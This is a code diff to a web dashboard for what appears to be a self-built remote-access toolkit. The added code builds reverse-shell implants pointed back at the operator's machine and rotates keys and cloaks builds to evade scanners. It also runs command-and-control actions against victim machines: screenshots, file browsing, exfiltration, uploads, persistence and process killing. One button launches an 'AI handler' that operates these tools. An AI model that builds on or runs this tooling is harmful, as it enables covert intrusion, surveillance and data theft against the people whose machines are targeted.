@@ -751,18 +751,53 @@ footer {
         <div class="section-title blue">ARSENAL</div>
         <div id="arsenal"></div>
 
-        <div class="section-title amber">OPERATIONS</div>
+        <div class="section-title" style="color:var(--pink)">PHASE 1 — BUILD</div>
         <div class="ops-grid">
+            <button class="op-btn" onclick="runOp('fresh')" style="border-color:var(--pink);color:var(--pink)">FRESH BUILD</button>
             <button class="op-btn" onclick="runOp('compile')">COMPILE ALL</button>
             <button class="op-btn" onclick="runOp('scan')">SCAN ALL</button>
-            <button class="op-btn" onclick="runOp('darkroom')">DARK ROOM</button>
-            <button class="op-btn" onclick="runOp('mutate')">MUTATE</button>
-            <button class="op-btn" onclick="runOp('cloak')">BUILD CLOAK</button>
-            <button class="op-btn" onclick="runOp('keygen')">REGEN PAYLOAD</button>
-            <button class="op-btn" onclick="runOp('recon')">RECON</button>
+            <button class="op-btn" onclick="runOp('mutate')">MUTATE KEYS</button>
             <button class="op-btn" onclick="runOp('keystatus')">KEY STATUS</button>
-            <button class="op-btn" onclick="runOp('ghost_test')" style="background:#0a1a1a;border-color:#00e5ff">GHOST TEST</button>
+            <button class="op-btn" onclick="runOp('keygen')">REGEN PAYLOAD</button>
+        </div>
+
+        <div class="section-title green">PHASE 2 — STEALTH</div>
+        <div class="ops-grid">
+            <button class="op-btn" onclick="runOp('darkroom')">DARK ROOM</button>
+            <button class="op-btn" onclick="runOp('cloak')">BUILD CLOAK</button>
+        </div>
+
+        <div class="section-title" style="color:var(--red)">PHASE 3 — DEPLOY</div>
+        <div class="ops-grid">
+            <button class="op-btn" onclick="runOp('c2shell')" style="border-color:var(--green);color:var(--green)">C2 SHELL</button>
+            <button class="op-btn" onclick="runOp('implant')" style="border-color:var(--cyan,#00bcd4)">BUILD IMPLANT</button>
             <button class="op-btn full danger" onclick="runOp('pentest')">FULL PENTEST</button>
+        </div>
+
+        <div class="section-title" style="color:var(--cyan,#00bcd4)">PHASE 4 — OPERATE</div>
+        <div class="ops-grid">
+            <button class="op-btn" onclick="runOp('op_sessions')">SESSIONS</button>
+            <button class="op-btn" onclick="runOp('op_screenshot')" style="border-color:#9b59b6">SCREENSHOT</button>
+            <button class="op-btn" onclick="runOp('op_browse')">BROWSE FILES</button>
+            <button class="op-btn" onclick="runOp('op_exfil')" style="border-color:#27ae60">EXFIL FILE</button>
+            <button class="op-btn" onclick="runOp('op_upload')" style="border-color:#27ae60">UPLOAD FILE</button>
+            <button class="op-btn" onclick="runOp('op_recon')">RECON</button>
+        </div>
+
+        <div class="section-title" style="color:var(--pink)">TCP C2 SHORTCUTS</div>
+        <div class="ops-grid">
+            <button class="op-btn" onclick="tcpOp('deploy')" style="border-color:var(--red)">DEPLOY</button>
+            <button class="op-btn" onclick="tcpOp('screenshot')" style="border-color:#9b59b6">SCREENSHOT</button>
+            <button class="op-btn" onclick="tcpOp('watch')" style="border-color:#3498db">WATCH</button>
+            <button class="op-btn" onclick="tcpOp('recon')">RECON</button>
+            <button class="op-btn" onclick="tcpOp('persist')" style="border-color:var(--red)">PERSIST</button>
+            <button class="op-btn" onclick="tcpOp('kill')" style="border-color:var(--red)">KILL PROC</button>
+        </div>
+
+        <div class="section-title amber">TOOLKIT</div>
+        <div class="ops-grid">
+            <button class="op-btn" onclick="runOp('ghost_test')" style="background:#0a1a1a;border-color:#00e5ff">GHOST TEST</button>
+            <button class="op-btn" onclick="runOp('handler')" style="border-color:var(--pink)">HANDLER AI</button>
         </div>
 
         <div class="section-title" style="color:var(--pink)">AGENTS</div>
@@ -1060,6 +1095,29 @@ async function agentOp(op) {
     } catch(e) {}
 }
 
+async function tcpOp(op) {
+    let body = {op: op};
+    if (op === 'kill') {
+        const proc = prompt('Process name to kill (e.g. notepad.exe):');
+        if (!proc) return;
+        body.target = proc;
+    } else if (op === 'watch') {
+        const interval = prompt('Refresh interval (seconds):', '5');
+        if (interval === null) return;
+        body.interval = parseInt(interval) || 5;
+    }
+    try {
+        const r = await fetch('/api/tcp/' + op, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(body),
+        });
+        const d = await r.json();
+        if (d.error) alert(d.error);
+        fetchStatus();
+    } catch(e) {}
+}
+
 fetchStatus();
 fetchConsole();
 fetchAgents();
@@ -1177,9 +1235,71 @@ class VaderHandler(BaseHTTPRequestHandler):
                 "GHOST ENCODE TEST",
                 [sys.executable, os.path.join(os.path.dirname(ROOT), "ghost-encoder", "ghost_encode.py"), "--test"],
             ),
+            "/api/run/c2shell": (
+                "C2 SHELL",
+                [sys.executable, os.path.join(ROOT, "shell", "vader_c2_v2.py")],
+            ),
+            "/api/run/implant": (
+                "BUILD DISCORD IMPLANT",
+                [sys.executable, os.path.join(ROOT, "deploy.py"), "--implant"],
+            ),
+            "/api/run/handler": (
+                "HANDLER AI OPERATOR",
+                [sys.executable, os.path.join(ROOT, "cheyanne_agent.py")],
+            ),
+            "/api/run/op_sessions": (
+                "LIST SESSIONS",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_sessions; op_sessions()"],
+            ),
+            "/api/run/op_screenshot": (
+                "SCREENSHOT TARGET",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_screenshot; op_screenshot()"],
+            ),
+            "/api/run/op_browse": (
+                "BROWSE TARGET FILES",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_browse; op_browse()"],
+            ),
+            "/api/run/op_exfil": (
+                "EXFIL FILE FROM TARGET",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_exfil; op_exfil()"],
+            ),
+            "/api/run/op_upload": (
+                "UPLOAD FILE TO TARGET",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_upload; op_upload()"],
+            ),
+            "/api/run/op_recon": (
+                "RECON TARGET",
+                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_recon; op_recon()"],
+            ),
         }
 
-        if path in ops:
+        if path == "/api/run/fresh":
+            if op_running.is_set():
+                self._json({"error": f"Operation already running: {op_name}"}, 409)
+                return
+            def _fresh():
+                try:
+                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    _s.connect(("8.8.8.8", 80))
+                    my_ip = _s.getsockname()[0]
+                    _s.close()
+                except Exception:
+                    my_ip = "192.168.1.92"
+                steps = [
+                    ("MUTATE ALL KEYS", [sys.executable, os.path.join(ROOT, "mutate.py")]),
+                    ("COMPILE SHELL", [sys.executable, os.path.join(ROOT, "deploy.py"), "--compile-shell", my_ip, "4443"]),
+                    ("SCAN ALL", [sys.executable, os.path.join(ROOT, "deploy.py"), "--status"]),
+                ]
+                for step_name, cmd in steps:
+                    console_write(f"[*] FRESH BUILD — {step_name}")
+                    run_operation(f"FRESH: {step_name}", cmd)
+                    while op_running.is_set():
+                        time.sleep(0.5)
+                console_write("[+] FRESH BUILD COMPLETE — all hashes unique")
+            threading.Thread(target=_fresh, daemon=True).start()
+            self._json({"ok": True, "operation": "FRESH BUILD"})
+
+        elif path in ops:
             name, cmd = ops[path]
             if op_running.is_set():
                 self._json({"error": f"Operation already running: {op_name}"}, 409)
@@ -1206,6 +1326,39 @@ class VaderHandler(BaseHTTPRequestHandler):
             result = dispatch_task(agent_id, op, **body)
             code = 200 if "ok" in result else 400
             self._json(result, code)
+
+        elif path.startswith("/api/tcp/"):
+            tcp_cmd = path.split("/api/tcp/")[1]
+            try:
+                length = int(self.headers.get("Content-Length", 0))
+                body = json.loads(self.rfile.read(length)) if length else {}
+            except Exception:
+                body = {}
+
+            tcp_scripts = {
+                "deploy": "deploy",
+                "screenshot": "screenshot",
+                "watch": "watch",
+                "recon": "recon",
+                "persist": "persist",
+                "kill": "kill",
+            }
+            if tcp_cmd not in tcp_scripts:
+                self._json({"error": f"Unknown TCP command: {tcp_cmd}"}, 400)
+                return
+            if op_running.is_set():
+                self._json({"error": f"Operation already running: {op_name}"}, 409)
+                return
+
+            script = os.path.join(ROOT, "shell", "vader_c2_v2.py")
+            tcp_arg = tcp_cmd
+            if tcp_cmd == "kill" and body.get("target"):
+                tcp_arg = f"kill {body['target']}"
+            elif tcp_cmd == "watch" and body.get("interval"):
+                tcp_arg = f"watch {body['interval']}"
+            cmd = [sys.executable, script, "--tcp-cmd", tcp_arg]
+            run_operation(f"TCP: {tcp_cmd.upper()}", cmd)
+            self._json({"ok": True, "operation": tcp_cmd})
 
         elif path.startswith("/api/agents/") and path.endswith("/kill"):
             agent_id = path.split("/")[3]
